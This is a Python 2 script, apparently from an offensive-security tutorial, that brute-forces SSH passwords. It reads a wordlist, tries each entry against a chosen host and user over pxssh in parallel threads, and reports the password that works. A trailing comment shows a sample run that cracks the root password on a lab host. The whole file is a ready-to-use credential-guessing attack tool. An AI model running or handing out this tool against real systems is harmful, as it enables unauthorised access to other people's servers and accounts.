from pexpect import pxssh
import optparse
import time
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

def connect(host, user, password, release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print '[+] Password Found: ' + password
        Found = True
    except Exception, e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()

def main():
    parser = optparse.OptionParser('usage%prog -H <target host> -u <user> -F <password list>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify password file')
    parser.add_option('-F', dest='passwdFile', type='string', help='specify passwrod file')
    parser.add_option('-u', dest='user', type='string', help='specify the user')
    (options, args) = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user
    if host is None or passwdFile is None or user is None:
        print parser.usage
        exit(0)

    fn = open(passwdFile, 'r')
    for line in fn.readlines():
        user = options.user
        if Found:
            print "[*] Exiting: Password Found"
            exit(0)
        if Fails > 5:
            print "[!] Exiting: Too Many Socket Timeouts"
            exit(0)
        connection_lock.acquire()
        password = line.strip('\r')  # Here may need to add .split('\n') on Windows OS
        print "[-] Testing: " + str(password)
        t = Thread(target=connect, args=(host, user, password, True))
        child = t.start()

if __name__ == '__main__':
    main()
    
#[root@NickCOS72V1 python]# python sshBrute.py -H NickCOS72V1.hpeswlab.net -u root -F pass.txt
#[-] Testing: 12345
#
#[-] Testing: root
#
#[-] Testing: 1Qaz2wsx
#
#[-] Testing: mypass
#
#[+] Password Found: mypass
#
